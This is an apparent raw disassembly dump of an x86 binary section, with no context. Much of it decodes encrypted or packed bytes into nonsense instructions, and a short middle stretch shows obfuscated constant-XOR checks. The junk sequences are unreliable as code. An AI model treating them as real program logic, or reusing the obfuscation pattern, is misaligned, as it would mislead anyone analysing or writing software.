  418d8e:	adc    edx,ebx
  418d90:	jmp    0x418fed
  418d95:	jmp    0x6c98:0xba87068d
  418d9c:	mov    bl,0x37
  418d9e:	cmc    
  418d9f:	mov    esp,0xcb4046a4
  418da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418da5:	inc    esp
  418da6:	sti    
  418da7:	sar    BYTE PTR [esi-0x41413dcb],0x38
  418dae:	out    dx,al
  418daf:	out    dx,eax
  418db0:	xchg   ebx,eax
  418db1:	loopne 0x418dd9
  418db3:	loopne 0x418d3c
  418db5:	call   FWORD PTR [ecx+0x45]
  418db8:	stos   BYTE PTR es:[edi],al
  418db9:	dec    edi
  418dba:	push   edi
  418dbb:	out    dx,eax
  418dbc:	and    al,0xa1
  418dbe:	push   eax
  418dbf:	cmp    BYTE PTR [edi+0x61],cl
  418dc2:	inc    edi
  418dc3:	pop    ecx
  418dc4:	in     eax,0xec
  418dc6:	idiv   DWORD PTR [esp+ecx*4-0x15]
  418dca:	clc    
  418dcb:	js     0x418e4a
  418dcd:	(bad)  
  418dce:	loop   0x418df1
  418dd0:	adc    BYTE PTR [edx-0x79],bh
  418dd3:	xchg   esp,eax
  418dd4:	(bad)  
  418dd5:	and    al,0xb1
  418dd7:	pop    ecx
  418dd8:	arpl   WORD PTR [esi],di
  418dda:	add    esi,DWORD PTR [esi+0x3c]
  418ddd:	jae    0x418d7f
  418ddf:	leave  
  418de0:	mov    bl,0xd
  418de2:	cs retf 
  418de4:	std    
  418de5:	adc    eax,0xa9251c4f
  418dea:	jmp    0xe218cac
  418def:	fstp   TBYTE PTR [ecx]
  418df1:	dec    esi
  418df2:	cli    
  418df3:	xchg   ebx,eax
  418df4:	or     al,0xf6
  418df6:	fmul   DWORD PTR [eax]
  418df8:	clc    
  418df9:	add    al,0xda
  418dfb:	es in  al,0x5d
  418dfe:	mov    ebp,0xcd6f246
  418e03:	jge    0x418e09
  418e05:	mov    ds:0x20fcbfd8,al
  418e0a:	mov    ebx,0x4751d8ce
  418e0f:	sbb    edi,DWORD PTR [ebx]
  418e11:	inc    eax
  418e12:	cmp    DWORD PTR [ebx+eax*4+0x44],ebx
  418e16:	fisubr WORD PTR [esi+0x538b3d4f]
  418e1c:	xchg   ebx,eax
  418e1d:	pop    esi
  418e1e:	or     esp,edx
  418e20:	pop    eax
  418e21:	pop    esi
  418e22:	in     al,dx
  418e23:	xor    DWORD PTR [esp+edi*8+0x5a],edx
  418e27:	scas   eax,DWORD PTR es:[edi]
  418e28:	retf   
  418e29:	cmp    DWORD PTR [esp+esi*2],edx
  418e2c:	mov    esp,0x86c65cbc
  418e31:	das    
  418e32:	repz das 
  418e34:	inc    esp
  418e35:	push   0xffffffca
  418e37:	mov    ebp,DWORD PTR [edx+0x37]
  418e3a:	cmp    al,0xe
  418e3c:	push   edi
  418e3d:	paddd  mm0,QWORD PTR [edi+ebx*2+0x1f423ee8]
  418e45:	lea    ecx,[esi-0x32f56627]
  418e4b:	mov    esp,ecx
  418e4d:	fchs   
  418e4f:	hlt    
  418e50:	mov    ss,WORD PTR [esi]
  418e52:	aaa    
  418e53:	push   0x2e4925ca
  418e58:	and    eax,0xf533dc69
  418e5d:	cdq    
  418e5e:	cmp    dl,bh
  418e60:	out    dx,al
  418e61:	sub    eax,0xabe11a53
  418e66:	mov    esp,0x94e9042c
  418e6b:	inc    ecx
  418e6c:	dec    esi
  418e6d:	add    DWORD PTR [edi+edx*4-0x72d3b05],0x5c
  418e75:	outs   dx,BYTE PTR ds:[esi]
  418e76:	mov    al,0xe0
  418e78:	gs test al,0x72
  418e7b:	int    0x77
  418e7d:	mov    ebp,0xa2f8950a
  418e82:	in     eax,0xb1
  418e84:	mov    ss,WORD PTR [eax]
  418e86:	das    
  418e87:	out    dx,al
  418e88:	jecxz  0x418eee
  418e8a:	sub    eax,0x82c32058
  418e8f:	ret    0xa8ba
  418e92:	add    al,bh
  418e94:	aas    
  418e95:	in     eax,0x6e
  418e97:	xor    DWORD PTR [ecx-0x61ca7a15],0x31fbcde5
  418ea1:	stos   BYTE PTR es:[edi],al
  418ea2:	or     eax,0xe8e7b21b
  418ea7:	push   edi
  418ea8:	jne    0x418e99
  418eaa:	dec    eax
  418eab:	inc    ecx
  418eac:	daa    
  418ead:	add    edi,ebp
  418eaf:	(bad)  
  418eb0:	xchg   esp,eax
  418eb1:	push   es
  418eb2:	ins    DWORD PTR es:[edi],dx
  418eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eb4:	and    BYTE PTR [ebp-0x3ef94d06],dl
  418eba:	js     0x418e7e
  418ebc:	mov    esi,0x7b77dfad
  418ec1:	jmp    0x418ea0
  418ec3:	stos   BYTE PTR es:[edi],al
  418ec4:	(bad)  
  418ec5:	clc    
  418ec6:	pop    edx
  418ec7:	push   cs
  418ec8:	sub    BYTE PTR ss:[ebx],ch
  418ecb:	ins    BYTE PTR es:[edi],dx
  418ecc:	mov    al,0x1
  418ece:	sbb    edi,ecx
  418ed0:	jmp    0x75de6580
  418ed5:	ret    0x7159
  418ed8:	inc    edx
  418ed9:	xchg   DWORD PTR ds:0x929497d2,edi
  418edf:	or     ebp,DWORD PTR [ebx+0x41]
  418ee2:	popa   
  418ee3:	xchg   bl,cl
  418ee5:	das    
  418ee6:	mov    ds:0x900c452c,eax
  418eeb:	sub    eax,0x3c55a45c
  418ef0:	mov    bh,0x54
  418ef2:	fmul   QWORD PTR [edi+ebx*2-0x16ba27ed]
  418ef9:	test   al,0x7
  418efb:	aaa    
  418efc:	inc    ecx
  418efd:	inc    eax
  418efe:	xchg   ebp,eax
  418eff:	out    dx,eax
  418f00:	mov    esp,0xc083a7a7
  418f05:	mov    al,ds:0x677fd997
  418f0a:	nop
  418f0b:	inc    DWORD PTR [ebx]
  418f0d:	test   dl,0xdf
  418f10:	call   0x49b5e351
  418f15:	test   DWORD PTR [edi],ebx
  418f17:	mov    ecx,0xc208542e
  418f1c:	pushf  
  418f1d:	jae    0x418ed2
  418f1f:	popf   
  418f20:	aam    0x57
  418f22:	lock mov WORD PTR [ebx],es
  418f25:	cs aas 
  418f27:	add    esp,ebx
  418f29:	adc    DWORD PTR [ecx+0x77],edi
  418f2c:	lods   eax,DWORD PTR ds:[esi]
  418f2d:	popa   
  418f2e:	stos   DWORD PTR es:[edi],eax
  418f2f:	mov    dl,0x7b
  418f31:	mov    cl,BYTE PTR [edx+0x73c0869e]
  418f37:	adc    bh,BYTE PTR [bp+si-0x20]
  418f3b:	push   es
  418f3c:	scas   al,BYTE PTR es:[edi]
  418f3d:	mov    al,ds:0xce11af3c
  418f42:	mov    bh,0x27
  418f44:	jl     0x418ee3
  418f46:	gs adc ah,bl
  418f49:	or     al,0x2a
  418f4b:	mov    ebp,0xc2595958
  418f50:	aad    0x88
  418f52:	mov    eax,ds:0x3fae5119
  418f57:	sti    
  418f58:	mov    esi,0xbdb316cd
  418f5d:	pop    edi
  418f5e:	or     al,0x2f
  418f60:	pop    edx
  418f61:	pop    esi
  418f62:	pop    esp
  418f63:	sbb    bh,BYTE PTR [edi-0x1b]
  418f66:	fwait
  418f67:	(bad)  
  418f68:	loop   0x418f68
  418f6a:	es jmp 0x1c73:0x952c69ef
  418f72:	mov    dl,0x75
  418f74:	or     eax,0xaeb2f932
  418f79:	mov    eax,ds:0x2453d2e4
  418f7e:	(bad)  
  418f7f:	icebp  
  418f80:	stos   DWORD PTR es:[edi],eax
  418f81:	xchg   ebx,eax
  418f82:	ss add eax,0xb144775
  418f88:	ret    
  418f89:	jne    0x418f4f
  418f8b:	lahf   
  418f8c:	inc    ebp
  418f8d:	inc    eax
  418f8e:	repnz or al,0xfd
  418f91:	jnp    0x418fae
  418f93:	aad    0xd0
  418f95:	sub    eax,DWORD PTR [edi-0x4da8b000]
  418f9b:	mov    bl,0x34
  418f9d:	(bad)  
  418f9f:	std    
  418fa0:	shl    DWORD PTR [edx],0x9a
  418fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fa4:	sub    DWORD PTR [ebp+0xd620c15],ecx
  418faa:	jle    0x419000
  418fac:	inc    ecx
  418fad:	dec    ebx
  418fae:	out    0x37,al
  418fb0:	ins    DWORD PTR es:[edi],dx
  418fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fb2:	mov    edi,0xc47524a0
  418fb7:	sbb    DWORD PTR [ebx+0x71],esi
  418fba:	push   ecx
  418fbb:	sub    al,0xf2
  418fbd:	mov    al,ds:0x9242a701
  418fc2:	stos   DWORD PTR es:[edi],eax
  418fc3:	ins    DWORD PTR es:[edi],dx
  418fc4:	or     dl,cl
  418fc6:	retf   
  418fc7:	lods   eax,DWORD PTR ds:[esi]
  418fc8:	sti    
  418fc9:	fst    DWORD PTR [ebx-0x53]
  418fcc:	pop    es
  418fcd:	xchg   ebx,eax
  418fce:	out    dx,al
  418fcf:	outs   dx,BYTE PTR ds:[esi]
  418fd0:	(bad)  
  418fd1:	cmp    cl,BYTE PTR [eax+0x5a]
  418fd4:	cdq    
  418fd5:	bound  eax,QWORD PTR [edx-0x41]
  418fd8:	jns    0x418fdb
  418fda:	dec    ebx
  418fdb:	mov    bh,0xa1
  418fdd:	(bad)  
  418fde:	mov    edi,0xadb72e53
  418fe3:	push   edi
  418fe4:	in     eax,0x79
  418fe6:	mov    cl,BYTE PTR [eax]
  418fe8:	push   es
  418fe9:	sbb    DWORD PTR [ebx-0x63746e3c],edi
  418fef:	and    al,0x8c
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [ebx],bh
  418ff5:	enter  0x850f,0x8
  418ff9:	add    BYTE PTR [eax],al
  418ffb:	add    BYTE PTR [ebx],bh
  418ffd:	fimul  DWORD PTR [edi]
  418fff:	test   BYTE PTR [ebx],dh
  419001:	sbb    DWORD PTR [eax],eax
  419003:	add    BYTE PTR [ebx-0x74bfdbbc],cl
  419009:	push   esp
  41900a:	and    al,0x18
  41900c:	xor    ecx,ecx
  41900e:	shld   ecx,eax,0x2
  419012:	jmp    0x41926f
  419017:	retf   0xad14
  41901a:	repnz mov eax,0x983c8a74
  419020:	xchg   edx,eax
  419021:	xor    bl,ch
  419023:	into   
  419024:	push   ebp
  419025:	ret    
  419026:	iret   
  419027:	mov    esp,0x35bec0ff
  41902c:	ret    0xbebe
  41902f:	aad    0x1c
  419031:	aam    0xc3
  419033:	xchg   BYTE PTR [ebx-0xda69e85],al
  419039:	dec    ecx
  41903a:	mov    ecx,0x6441cf47
  41903f:	std    
  419040:	(bad)  
  419041:	push   0x30eb1157
  419046:	xchg   edx,eax
  419047:	pop    es
  419048:	retf   
  419049:	stc    
  41904a:	add    dl,BYTE PTR [esi-0x7a]
  41904d:	fmul   QWORD PTR [esi-0x63]
  419050:	(bad)  
  419051:	fyl2xp1 
  419053:	sub    ebp,DWORD PTR [edi-0x47c9dfee]
  419059:	fnstenv [eax]
  41905b:	dec    ecx
  41905c:	and    ch,BYTE PTR [ebx-0x4e400f77]
  419062:	mov    dh,0x1e
  419064:	sbb    dh,ah
  419066:	jae    0x418ff1
  419068:	loope  0x418fea
  41906a:	rol    ah,1
  41906c:	jae    0x41907e
  41906e:	pop    ebp
  41906f:	mov    edi,0x2260b97f
  419074:	pop    ebx
  419075:	or     ecx,DWORD PTR [ebp-0x15]
  419078:	imul   ebp,eax,0x454a18f1
  41907e:	fwait
  41907f:	pop    eax
  419080:	test   DWORD PTR [ecx-0x42],0x96490804
  419087:	test   esp,esp
  419089:	icebp  
  41908a:	add    dl,BYTE PTR [ecx-0x3e]
  41908d:	and    BYTE PTR [ecx],al
  41908f:	(bad)  
  419090:	(bad)  
  419091:	popf   
  419092:	sub    bh,bl
  419094:	stos   DWORD PTR es:[di],eax
  419096:	in     eax,0x49
  419098:	xlat   BYTE PTR ds:[ebx]
  419099:	scas   eax,DWORD PTR es:[edi]
  41909a:	mov    esp,0x9f56f548
  41909f:	sti    
  4190a0:	fwait
  4190a1:	mov    eax,0x7744bdcc
  4190a6:	cdq    
  4190a7:	xchg   ecx,eax
  4190a8:	mov    ecx,0x5f7026a
  4190ad:	push   eax
  4190af:	rcr    DWORD PTR [edx-0x25],1
  4190b2:	push   es
  4190b3:	ret    
  4190b4:	cmp    BYTE PTR [ebp+0x1eb68c1a],cl
  4190ba:	sub    ecx,ecx
  4190bc:	loope  0x419041
  4190be:	adc    al,0x4c
  4190c0:	pop    ebp
  4190c1:	in     al,dx
  4190c2:	shr    BYTE PTR [edx+0x1b234a72],cl
  4190c8:	into   
  4190c9:	mov    ebp,0xbe7d8254
  4190ce:	enter  0x2d97,0x30
  4190d2:	sub    edi,ebx
  4190d4:	dec    edi
  4190d5:	loope  0x419084
  4190d7:	mov    ds:0xd902fde4,al
  4190dc:	or     edx,DWORD PTR [esi+ebx*8]
  4190df:	enter  0x7654,0xdd
  4190e3:	push   cs
  4190e4:	cld    
  4190e5:	adc    eax,0x2933392e
  4190ea:	(bad)  
  4190eb:	push   ss
  4190ec:	jmp    0xe5e6:0x96dcc1c
  4190f3:	mov    bl,0x59
  4190f5:	in     al,dx
  4190f6:	popa   
  4190f7:	(bad)  
  4190f8:	test   dh,0xe5
  4190fb:	push   es
  4190fc:	sub    BYTE PTR [edx-0x1e],bh
  4190ff:	mov    ecx,0x35ad5207
  419104:	jnp    0x4190d1
  419106:	sbb    eax,0x3b21e211
  41910b:	imul   esi,DWORD PTR [ecx+ecx*1+0x43c0bec1],0x47
  419113:	adc    esi,DWORD PTR [edx+ebx*1]
  419116:	pop    esi
  419117:	push   edi
  419118:	push   ebp
  419119:	adc    al,BYTE PTR [edi+0x1d]
  41911c:	mov    dh,0xf
  41911e:	data16 (bad) 
  419120:	xchg   esi,eax
  419121:	push   edx
  419122:	stos   BYTE PTR es:[edi],al
  419123:	cs sbb eax,0x35112874
  419129:	call   0x7a84d926
  41912e:	mov    ch,0xbe
  419130:	sub    ch,BYTE PTR [edx]
  419132:	add    BYTE PTR [eax+0x46],dl
  419135:	mov    esi,edi
  419137:	dec    ecx
  419138:	ja     0x41917c
  41913a:	imul   ebx,DWORD PTR [ebx+0x24],0x19d37ce0
  419141:	out    0x1f,al
  419143:	xor    al,BYTE PTR [ecx-0x4]
  419146:	das    
  419147:	dec    ecx
  419148:	jne    0x419131
  41914a:	and    eax,0x244d99aa
  41914f:	xchg   DWORD PTR [edx],esi
  419151:	mov    ch,0xd8
  419153:	add    al,0xc5
  419155:	push   edi
  419156:	adc    esp,ebx
  419158:	ret    0x2b9f
  41915b:	inc    eax
  41915c:	jns    0x419131
  41915e:	(bad)  
  41915f:	mul    BYTE PTR [eax]
  419161:	retf   0xeb7c
  419164:	imul   esi,DWORD PTR [ebx+0x2d],0xffffffd7
  419168:	loope  0x4191cf
  41916a:	rcl    DWORD PTR [ebp-0x7bccc826],0x3e
  419171:	inc    esi
  419172:	cld    
  419173:	lock mov edx,0x6a4fbdaa
  419179:	test   BYTE PTR [eax],bl
  41917b:	dec    eax
  41917c:	test   al,0xc
  41917e:	sub    al,0x81
  419180:	(bad)  
  419181:	into   
  419182:	add    DWORD PTR [edx],edi
  419184:	push   ebp
  419185:	cmp    BYTE PTR [ebx+0x10ea9a90],ch
  41918b:	das    
  41918c:	(bad)  
  41918d:	outs   dx,DWORD PTR ds:[esi]
  41918e:	aas    
  41918f:	add    al,0x4e
  419191:	jmp    0x45a2:0x44372a0a
  419198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419199:	adc    BYTE PTR [edi-0x60],0x63
  41919d:	fwait
  41919e:	retf   0x7dfe
  4191a1:	push   es
  4191a2:	jg     0x419198
  4191a4:	shl    BYTE PTR [ebp-0x3],cl
  4191a7:	add    DWORD PTR [edx-0x27260a49],edi
  4191ad:	or     dl,BYTE PTR [ecx-0x75295d52]
  4191b3:	sub    DWORD PTR [edi],ebp
  4191b5:	(bad)  
  4191b6:	mov    esp,0x8aec05da
  4191bb:	cwde   
  4191bc:	(bad)  
  4191bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191be:	iret   
  4191bf:	jge    0x419183
  4191c1:	xchg   ebp,eax
  4191c2:	inc    eax
  4191c3:	and    BYTE PTR [edi],0x2e
  4191c6:	fcomp  DWORD PTR ds:0xa27c15c8
  4191cc:	loopne 0x419162
  4191ce:	cwde   
  4191cf:	std    
  4191d0:	sub    dh,ch
  4191d2:	mov    cl,0x91
  4191d4:	dec    ecx
  4191d5:	push   ss
  4191d6:	mov    esi,0xd9ddf2a0
  4191db:	jle    0x419179
  4191dd:	xor    BYTE PTR [eax],0x3e
  4191e0:	clc    
  4191e1:	(bad)  
  4191e2:	shl    DWORD PTR [edx+edi*8+0x1e2b0f12],1
  4191e9:	imul   esp,DWORD PTR [esi+0x5ba87aaa],0x12
  4191f0:	cmp    edx,eax
  4191f2:	push   ebp
  4191f3:	mov    dh,0xd8
  4191f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191f6:	stos   BYTE PTR es:[edi],al
  4191f7:	dec    ebp
  4191f8:	les    eax,FWORD PTR [edi-0x29d77af6]
  4191fe:	mov    BYTE PTR [eax-0xd333128],0xa0
  419205:	xchg   BYTE PTR [eax-0x4dcbe697],bh
  41920b:	add    BYTE PTR [esi],cl
  41920d:	sub    edi,DWORD PTR [ebp-0x5e]
  419210:	sbb    al,0x25
  419212:	ficomp WORD PTR [ecx+0x46]
  419215:	outs   dx,DWORD PTR ds:[esi]
  419216:	pop    es
  419217:	mov    al,ds:0xfd2cff8d
  41921c:	add    al,0x23
  41921e:	dec    eax
  41921f:	dec    eax
  419220:	mov    bh,0x97
  419222:	retf   
  419223:	push   edi
  419224:	jge    0x41927d
  419226:	retf   0x9b27
  419229:	or     al,BYTE PTR [edx]
  41922b:	repnz or DWORD PTR [edi+0x2d],0x7b
  419230:	or     DWORD PTR [esi-0x16],ebp
  419233:	outs   dx,BYTE PTR ds:[esi]
  419235:	adc    DWORD PTR [edx-0x80],esp
  419238:	iret   
  419239:	pop    eax
  41923a:	push   ebx
  41923b:	outs   dx,DWORD PTR ds:[esi]
  41923c:	jno    0x4192a3
  41923e:	pop    ds
  41923f:	out    dx,eax
  419240:	inc    ecx
  419241:	or     eax,0xd31d047d
  419246:	xor    dl,BYTE PTR [esi+0x1d92612c]
  41924c:	in     eax,0x82
  41924e:	stos   DWORD PTR es:[edi],eax
  41924f:	sub    dh,BYTE PTR [edi+0x7623a34a]
  419255:	push   esp
  419256:	mov    bl,0x4b
  419258:	fsub   DWORD PTR [ebx+edi*8]
  41925b:	inc    esp
  41925c:	fucomp st(1)
  41925e:	jb     0x419241
  419260:	jp     0x419299
  419262:	jp     0x419232
  419264:	cs add ah,0x9d
  419268:	in     al,dx
  419269:	xor    eax,0x94f6c062
  41926e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41926f:	shl    eax,0x2
  419272:	mov    ebx,0xcb79b576
  419277:	mov    DWORD PTR [esp+0x10],edx
  41927b:	mov    edx,DWORD PTR [esp+0x1c]
  41927f:	xor    eax,ebx
  419281:	xor    ecx,esi
  419283:	mov    DWORD PTR [esp+0x14],edx
  419287:	cmp    eax,DWORD PTR [esp+0x10]
  41928b:	jne    0x419299
  419291:	cmp    ecx,edx
  419293:	je     0x41a93c
  419299:	mov    eax,DWORD PTR [esp+0x44]
  41929d:	cmp    eax,0xa5069baa
  4192a2:	je     0x4192f6
  4192a8:	mov    edx,DWORD PTR [esp+0x18]
  4192ac:	mov    eax,DWORD PTR [esp+0x1c]
  4192b0:	xor    eax,esi
  4192b2:	xor    edx,0xcb79b577
  4192b8:	shrd   edx,eax,0x2
  4192bc:	shr    eax,0x2
  4192bf:	mov    DWORD PTR [esp+0x34],eax
  4192c3:	mov    eax,DWORD PTR [esp+0x18]
  4192c7:	mov    ecx,DWORD PTR [esp+0x1c]
  4192cb:	shl    eax,0x1e
  4192ce:	xor    eax,0x80000000
  4192d3:	or     eax,DWORD PTR [esp+0x34]
  4192d7:	xor    ecx,ecx
  4192d9:	mov    DWORD PTR [esp+0x14],eax
  4192dd:	mov    eax,DWORD PTR [esp+0x60]
  4192e1:	or     ecx,edx
  4192e3:	cdq    
  4192e4:	cmp    ecx,eax
  4192e6:	jne    0x41a93c
  4192ec:	cmp    DWORD PTR [esp+0x14],edx
  4192f0:	jne    0x41a93c
  4192f6:	mov    DWORD PTR [esp+0x5c],0x4227c4
  4192fe:	mov    DWORD PTR [esp+0x68],0x4227bc
  419306:	mov    eax,DWORD PTR [esp+0x78]
  41930a:	mov    eax,DWORD PTR [esp+0x78]
  41930e:	mov    edx,DWORD PTR [esp+0x18]
  419312:	xor    ecx,ecx
  419314:	shld   ecx,eax,0x2
  419318:	shl    eax,0x2
  41931b:	mov    DWORD PTR [esp+0x10],edx
  41931f:	mov    edx,DWORD PTR [esp+0x1c]
  419323:	xor    eax,ebx
  419325:	xor    ecx,esi
  419327:	mov    DWORD PTR [esp+0x14],edx
  41932b:	cmp    DWORD PTR [esp+0x10],eax
  41932f:	jne    0x41a5e3
  419335:	cmp    edx,ecx
  419337:	jne    0x41a5e3
  41933d:	mov    DWORD PTR [esp+0x30],0x42274c
  419345:	mov    eax,DWORD PTR [esp+0x18]
  419349:	mov    ecx,DWORD PTR [esp+0x1c]
  41934d:	shrd   eax,ecx,0x2
  419351:	shr    ecx,0x2
  419354:	mov    ecx,DWORD PTR [esp+0x18]
  419358:	mov    edx,DWORD PTR [esp+0x1c]
  41935c:	mov    edx,DWORD PTR [esp+0x30]
  419360:	mov    edx,DWORD PTR [edx+0xc]
  419363:	mov    DWORD PTR [esp+0xc],eax
  419367:	shl    ecx,0x1e
  41936a:	mov    eax,0x32de6d5d
  41936f:	xor    DWORD PTR [esp+0xc],eax
  419373:	xor    ecx,ecx
  419375:	or     ecx,DWORD PTR [esp+0xc]
  419379:	cmp    ecx,DWORD PTR [edx]
  41937b:	jne    0x41a320
  419381:	mov    ecx,0x65c7
  419386:	mov    WORD PTR [esp+0x2c],cx
  41938b:	mov    ecx,0x6062
  419390:	mov    WORD PTR [esp+0x24],cx
  419395:	mov    ecx,0x125d
  41939a:	mov    WORD PTR [esp+0xc],cx
  41939f:	movzx  ecx,WORD PTR [esp+0xc]
  4193a4:	mov    edx,0x2d0f
  4193a9:	and    cx,dx
  4193ac:	mov    dx,WORD PTR [esp+0x24]
  4193b1:	or     cx,dx
  4193b4:	mov    dx,WORD PTR [esp+0x2c]
  4193b9:	add    cx,dx
  4193bc:	or     ecx,0x3b22
  4193c2:	mov    WORD PTR [esp+0x3c],cx
  4193c7:	mov    ecx,0x57d4
  4193cc:	mov    WORD PTR [esp+0x2c],cx
  4193d1:	mov    ecx,0x3b21
  4193d6:	mov    WORD PTR [esp+0x38],cx
  4193db:	mov    ecx,0x52fd
  4193e0:	mov    WORD PTR [esp+0x24],cx
  4193e5:	mov    ecx,0x2ce0
  4193ea:	mov    WORD PTR [esp+0xc],cx
  4193ef:	mov    cx,WORD PTR [esp+0xc]
  4193f4:	mov    dx,WORD PTR [esp+0x24]
  4193f9:	jmp    0x419656
  4193fe:	gs pop ss
  419400:	dec    BYTE PTR [eax+esi*4]
  419403:	sbb    al,0x6b
  419405:	mov    esp,0xd16889ea
  41940a:	mov    ecx,0x33dd02d9
  41940f:	add    eax,0xc235bec0
  419414:	mov    esi,0xd50a65be
  419419:	mov    WORD PTR ds:0x757423d4,ds
  41941f:	adc    esp,DWORD PTR [edx+0x22]
  419422:	in     eax,dx
  419423:	(bad)  
  419424:	or     edx,DWORD PTR [eax+0x2a]
  419427:	push   esi
  419428:	adc    esp,DWORD PTR [ebp-0x204190f0]
  41942e:	mov    esi,0xf758dba5
  419433:	int3   
  419434:	pop    edi
  419435:	push   0x5d
  419437:	jo     0x4193f9
  419439:	(bad)  
  41943a:	fst    DWORD PTR [edx-0x62d59789]
  419440:	inc    eax
  419441:	add    eax,0x617b052d
  419446:	or     esi,DWORD PTR [esi+eax*8]
  419449:	sbb    al,0xda
  41944b:	neg    al
  41944d:	jle    0x4193df
  41944f:	mov    ds,WORD PTR [edx]
  419451:	or     BYTE PTR [ebp+ebx*2+0x4],al
  419455:	jo     0x4193e5
  419457:	push   esp
  419458:	(bad)  
  419459:	std    
  41945a:	popf   
  41945b:	loope  0x4193e4
  41945d:	mul    DWORD PTR [ecx]
  41945f:	mov    ch,0xfb
  419461:	jmp    DWORD PTR [ecx-0x177f2803]
  419467:	lea    esp,[ebp+0x3de270fb]
  41946d:	or     edi,ebp
  41946f:	inc    ebp
  419470:	xchg   edi,eax
  419471:	out    0x38,eax
  419473:	sti    
  419474:	sti    
  419475:	sub    dl,BYTE PTR [eax-0xabad5b]
  41947b:	sbb    BYTE PTR [ebx-0x42f49c88],dl
  419481:	jae    0x4194d6
  419483:	jmp    0xe16705dd
  419488:	out    0xad,eax
  41948a:	or     ebp,DWORD PTR [esi-0x4717ec6e]
  419490:	and    ebp,DWORD PTR [esi+0x12]
  419493:	add    DWORD PTR [ecx+ebx*1+0x89e631f],eax
  41949a:	sbb    esp,DWORD PTR [edx-0xa62a26f]
  4194a0:	out    dx,al
  4194a1:	inc    eax
  4194a2:	(bad)  
  4194a3:	loope  0x4194b3
  4194a5:	(bad)  
  4194a6:	outs   dx,BYTE PTR ds:[esi]
  4194a7:	ins    DWORD PTR es:[edi],dx
  4194a8:	sbb    BYTE PTR [edx+0x4f40c0bd],ch
  4194ae:	xchg   ebp,eax
  4194af:	sbb    DWORD PTR [esi+0x443d3201],edi
  4194b5:	mov    ebx,0xa1e35005
  4194ba:	fcmovnbe st,st(5)
  4194bc:	or     al,0x79
  4194be:	xchg   ecx,eax
  4194bf:	int    0x1c
  4194c1:	add    bl,ch
  4194c3:	adc    dh,bl
  4194c5:	call   0xefb73019
  4194ca:	or     ebx,edi
  4194cc:	in     al,dx
  4194cd:	ret    
  4194ce:	addr16 push cs
  4194d0:	pushf  
  4194d1:	push   edi
  4194d2:	rcl    BYTE PTR [ecx],cl
  4194d4:	lea    esi,[ebx]
  4194d6:	add    eax,0x50b23c1c
  4194db:	repz sub BYTE PTR [ebx],bl
  4194de:	pop    esi
  4194df:	push   0xcff2b136
  4194e4:	push   ebx
  4194e5:	jmp    0x419549
  4194e7:	inc    esi
  4194e8:	ja     0x4194a7
  4194ea:	inc    ebp
  4194eb:	in     al,0xac
  4194ed:	push   edi
  4194ee:	imul   esp,DWORD PTR [ebx+0x6c228d6e],0xffffffd7
  4194f5:	bound  esp,QWORD PTR [eax-0x7c88879]
  4194fb:	pop    edx
  4194fc:	mov    cl,0x4c
  4194fe:	leave  
  4194ff:	je     0x4194ce
  419501:	mov    edx,ds
  419503:	push   0xffffff97
  419505:	sbb    al,0x33
  419507:	mov    al,0x83
  419509:	shr    cl,0x5a
  41950c:	in     al,dx
  41950d:	push   esp
  41950e:	call   0x72b9:0x13307d41
  419515:	jecxz  0x4194c9
  419517:	or     al,0xa0
  419519:	push   0x1e289383
  41951e:	jmp    0x1e1b:0x3788467a
  419525:	dec    edi
  419526:	adc    DWORD PTR [eax-0x1553d29b],esp
  41952c:	repz les ecx,FWORD PTR [ecx+0x5bb86aec]
  419533:	sahf   
  419534:	aam    0xc
  419536:	arpl   cx,si
  419538:	aam    0xf2
  41953a:	xor    ebp,DWORD PTR [ecx-0x6]
  41953d:	inc    esi
  41953e:	idiv   BYTE PTR [ebx-0x61d382db]
  419544:	xor    al,0xcc
  419546:	retf   
  419547:	outs   dx,DWORD PTR ds:[esi]
  419548:	cmc    
  419549:	inc    edi
  41954a:	pop    ebx
  41954b:	jecxz  0x419570
  41954d:	fwait
  41954e:	push   edx
  41954f:	fnstcw WORD PTR [edx+0x41]
  419552:	sbb    eax,0x65631f4b
  419557:	into   
  419558:	repnz xchg edi,eax
  41955b:	sub    BYTE PTR [ebx],bl
  41955d:	adc    ebx,DWORD PTR [esi-0x30]
  419560:	idiv   BYTE PTR [ebx]
  419562:	push   esp
  419563:	and    BYTE PTR [esi-0x64669157],al
  419569:	sbb    eax,0x677f7e9b
  41956e:	aas    
  41956f:	fst    QWORD PTR [eax+0x65]
  419572:	sahf   
  419573:	fbld   TBYTE PTR [esi+eax*4-0x1d]
  419577:	out    dx,al
  419578:	jmp    0xd75f:0xd11fc8bc
  41957f:	clc    
  419580:	enter  0x800f,0x1d
  419584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419585:	aaa    
  419586:	xlat   BYTE PTR ss:[ebx]
  419588:	test   DWORD PTR [esi-0x4a],ebx
  41958b:	inc    edx
  41958c:	inc    edi
  41958d:	push   esp
  41958e:	fadd   QWORD PTR [esi-0x12]
  419591:	popa   
  419592:	jmp    0x419564
  419594:	xor    DWORD PTR [edi+0x7b],0x54
  419598:	loope  0x419573
  41959a:	add    DWORD PTR [edi-0x1b],ebx
  41959d:	aas    
  41959e:	push   ebp
  41959f:	xor    bh,BYTE PTR [edi]
  4195a1:	sub    ecx,DWORD PTR [edx-0x17]
  4195a4:	dec    ebx
  4195a5:	test   BYTE PTR [ecx-0x19],bh
  4195a8:	div    BYTE PTR cs:[ebp+0x12]
  4195ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195ad:	call   0xe47305dd
  4195b2:	xor    eax,0x7910acb9
  4195b7:	push   esp
  4195b8:	imul   ebx,DWORD PTR [esi],0xffffffe8
  4195bb:	test   eax,0xd763cd0b
  4195c0:	(bad)  
  4195c1:	jmp    DWORD PTR [edx-0x53]
  4195c4:	jmp    0x3a295dc4
  4195c9:	loopne 0x4195f3
  4195cb:	pop    eax
  4195cc:	xor    DWORD PTR [edx+0x4d2f0257],esi
  4195d2:	mov    WORD PTR [eax-0x3e],ss
